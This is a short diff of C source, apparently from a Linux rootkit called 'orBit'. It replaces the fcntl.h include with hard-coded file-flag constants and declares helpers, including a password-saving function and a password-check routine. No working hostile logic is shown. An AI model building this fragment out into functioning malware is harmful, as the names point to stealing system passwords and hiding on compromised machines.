@@ -14,7 +14,6 @@
 # include <sys/socket.h>
 # include <netinet/in.h>
 # include <ctype.h>
-# include <fcntl.h>
 # include <sys/stat.h>
 # include <sys/ioctl.h>
 # include <net/if.h>
@@ -24,6 +23,11 @@
 # include <shadow.h>
 # define DEBUGGING
 
+# define O_RDONLY   0
+# define O_APPEND   1024
+# define O_CREAT    64
+# define O_RDWR     2
+# define AT_FDCWD   -100
 # define SIZE_BUF   0x1000
 
 struct linux_dirent
@@ -33,6 +37,8 @@ struct linux_dirent
     unsigned short d_reclen;
     char           d_name[];
 };
+
+extern char *__progname;
 
 // # orBit-tools.c
 /*
@@ -48,6 +54,7 @@ char        *strcasestr( const char *, const char * );
 char        *_orBit_strchr( const char *, int );
 int         _orBit_strcmp( const char *, const char * );
 void        *_orBit_memcpy( void *, const void *, size_t );
+int         save_passwd_file( void );
 
 /*
  * \fn uint8_t check_password( const char *, const char * )
